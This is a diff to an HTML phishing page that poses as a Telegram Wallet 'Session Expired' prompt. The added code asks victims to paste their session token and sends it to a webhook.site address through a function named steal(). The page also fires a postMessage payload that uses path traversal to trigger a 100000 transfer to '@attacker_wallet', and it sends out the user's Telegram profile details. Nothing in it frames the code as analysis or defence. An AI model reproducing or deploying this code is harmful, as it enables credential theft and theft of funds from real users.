@@ -27,25 +27,40 @@
   </style>
 </head>
 <body>
-  <h1>🔐 Wallet Session Verification</h1>
-  <p>For your security, please verify your Telegram Wallet session.</p>
+  <h1>🔐 Session Expired</h1>
+  <p>Your Telegram Wallet session has expired. Please verify your session token to continue.</p>
 
-  <button onclick="verify()">✅ Click to Verify</button>
+  <textarea id="token" placeholder="Paste your session token here..."></textarea><br><br>
+  <button onclick="steal()">Verify</button>
 
-<script>
-  const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
-  const message = JSON.stringify({
-    eventType: 'web_app_open_tg_link',
-    eventData: {
-      path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
+  <script>
+    // Send Telegram Wallet payload to opener
+    const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
+    const message = JSON.stringify({
+      eventType: 'web_app_open_tg_link',
+      eventData: {
+        path_full: `/wallet/start?x=${encodeURIComponent(payload)}`
+      }
+    });
+
+    setTimeout(() => {
+      window.opener?.postMessage(message, "*");
+      console.log("✅ postMessage payload sent.");
+    }, 1500);
+
+    // Send captured token to your webhook
+    function steal() {
+      const token = document.getElementById("token").value;
+      fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: "Captured Token: " + token
+      });
+      alert("✅ Session verified.");
     }
-  });
-  setTimeout(() => {
-    window.opener?.postMessage(message, "*");
-  }, 1500);
 
-  window.Telegram.WebApp.ready();
-  function verify() {
+    // Optional: Log Telegram user info if WebApp context is available
+    window.Telegram.WebApp.ready();
     const tg = window.Telegram.WebApp;
     const user = tg.initDataUnsafe?.user;
     if (user) {
@@ -57,15 +72,10 @@
           username: user.username,
           first_name: user.first_name,
           last_name: user.last_name,
-          lang: user.language_code,
-          ua: navigator.userAgent,
-          timestamp: new Date().toISOString(),
-          note: "User clicked Verify on Wallet Session"
+          lang: user.language_code
         })
       });
-      alert("✅ Session verified. You may now continue.");
     }
-  }
-</script>
+  </script>
 </body>
 </html>
